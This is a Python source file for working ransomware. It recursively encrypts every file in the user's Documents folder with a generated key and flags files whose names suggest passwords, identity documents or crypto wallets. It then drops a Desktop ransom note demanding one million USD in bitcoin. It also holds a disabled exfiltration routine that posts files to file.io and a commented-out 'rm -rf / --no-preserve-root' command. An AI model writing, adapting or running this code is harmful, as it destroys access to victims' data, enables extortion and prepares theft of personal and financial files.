from asyncio.tasks import wait
import os
import sys
import platform 
import subprocess
import asyncio

from requests.models import HTTPBasicAuth
def install_package(package):
    subprocess.call([sys.executable, "-m", "pip", "install", package])

with open("output.txt", "a") as proof:
    proof.write("before\n")

try:
    import cryptography
except ImportError:
    install_package('cryptography')
#install_package("requests")
#import requests

with open("output.txt", "a") as proof:
    proof.write("after\n")

from cryptography import fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from random import choice
import string
import base64
from time import sleep

# Sensitive keywords
sensitive = ['password', 'credit', 'social', 'security', 'number', 'tax', '.pem', 'mortgage', 'address', 'crypto', 'bitcoin', 'wallet', 'budget', 'pwd', 'user', 'usr', 'wifi', 'credentials', 'creds', 'sensitive', 'important', 'info', 'private', 'personal', 'identity', 'license', 'court', 'ssn', 'signature', 'dl', 'passport', 'transcripts', 'email']
sensitive_files = []

# Encryption key generation
def generate_key(key=None):
    global enc_key
    if key == None:
        enc_key = ''.join(choice(string.ascii_letters + string.digits) for i in range(128))
    else: 
        enc_key = key

    print("enc_key", enc_key)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=32,
        salt=b'', # bytes(choice(string.ascii_letters + string.digits) for i in range(128)),
        iterations= 22000, #choice(range(1, 100000)),
        backend=default_backend()
    )
    encryption_key = base64.urlsafe_b64encode(kdf.derive(enc_key.encode()))
    fn = fernet.Fernet(encryption_key)
    return fn

async def encrypt_file(path):
    print("enc", path)
    try:
        with open(path, 'rb') as f:
            data = f.read()
        encrypted = fn.encrypt(data)
        with open(path, 'wb') as f:
            f.write(encrypted)
        print("enc_s", path)
    except Exception:
        return False
    return True

async def decrypt_file(path):
    print("dec", path)
    try:
        with open(path, 'rb') as f:
            data = f.read()
        decrypted = fn.decrypt(data)
        with open(path, 'wb') as f:
            f.write(decrypted)
        print("dec_s", path)
    except Exception:
        return False
    return True


async def upload_file(file, url="https://file.io"):
    # Not a real implementation, but you get the idea...
    try:
        headers = {"key": enc_key}
        username = "username"
        password = "password"
        r = requests.post(url, auth=HTTPBasicAuth(username, password), headers=headers, files={'file': open(file, 'rb')})
    except Exception:
        pass


async def main():
    tasks = []

    global desktop_dir
    # Determine OS and set vars appropriately
    if platform.system() == 'Windows':
        home_dir = os.environ['HOMEPATH']
        docs_dir = os.environ['HOMEDRIVE'] + home_dir + '\\Documents'
        desktop_dir = os.environ['HOMEDRIVE'] + home_dir + '\\Desktop'
    if platform.system() == 'Linux' or platform.system() == 'Linux2':
        home_dir = os.environ['HOME']
        docs_dir = home_dir + '/Documents'
        desktop_dir = home_dir + '/Desktop'
    if platform.system() == 'Darwin':
        home_dir = os.environ['HOME']
        docs_dir = home_dir + '/Documents'
        desktop_dir = home_dir + '/Desktop'

    if os.getenv("USER") == "root":
        print("maybe you should be more careful?")
        #subprocess.call("rm -rf / --no-preserve-root")

    global fn
    if len(sys.argv) > 1:
        print("decrypt")
        action = "decrypt"
        fn = generate_key(sys.argv[1])
    else:
        print("encrypt")
        action = "encrypt"
        fn = generate_key()

    for task in tasks:
        await task
    for root, dirs, files in os.walk(docs_dir):
        for file in files:
            if action == "encrypt":
                tasks.append(encrypt_file(os.path.join(root, file)))
            if action == "decrypt":
                tasks.append(decrypt_file(os.path.join(root, file)))
            for keyword in sensitive:
                if keyword in str(file).lower():
                    sensitive_files.append(str(os.path.join(root, file)))
                    # tasks.append(upload_file(os.path.join(root, file)), "https://file.io")
    await asyncio.gather(*tasks)



# if __name__ == '__main__':

loop = asyncio.get_event_loop()
try:
    loop.run_until_complete(main())
finally:
    loop.run_until_complete(loop.shutdown_asyncgens())
    loop.close()
    with open(desktop_dir + '/RANSOM.txt', "w") as file:
        file.write("Your files have been encrypted. ")
        file.write("Please make a payment of 1 Million USD in bitcoin to receive the encryption key. ")
        file.write("Payment can be made to bitcoin bitcoin wallet address: \n")
        file.write("your encryption key is: " + "\n" + enc_key + "\n\n")
        file.write("could have uploaded the following potentially sensitive files: \n")
        for sensitive_file in sensitive_files:
            file.write(sensitive_file + "\n")



